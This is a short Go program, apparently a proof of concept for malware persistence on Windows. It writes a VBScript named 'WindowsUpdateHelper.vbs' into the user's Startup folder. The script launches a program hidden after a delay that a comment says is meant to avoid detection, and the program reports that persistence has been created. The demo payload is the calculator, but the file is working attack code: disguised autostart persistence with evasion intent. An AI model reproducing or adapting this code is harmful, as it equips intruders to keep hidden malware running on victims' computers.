package main

import (
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	// Get current user's startup folder (no admin needed)
	startupPath := filepath.Join(os.Getenv("APPDATA"), 
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	
	// Create a VBS script that launches calc.exe
	vbsContent := `Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 5000  ' Delay 5 seconds to avoid detection
WshShell.Run "calc.exe", 0, False
Set WshShell = Nothing`
	
	// Save as legitimate-looking file
	vbsFile := filepath.Join(startupPath, "WindowsUpdateHelper.vbs")
	
	err := os.WriteFile(vbsFile, []byte(vbsContent), 0644)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	
	fmt.Printf("âœ“ Persistence created: %s\n", vbsFile)
	fmt.Println("Calculator will start automatically on next login")
}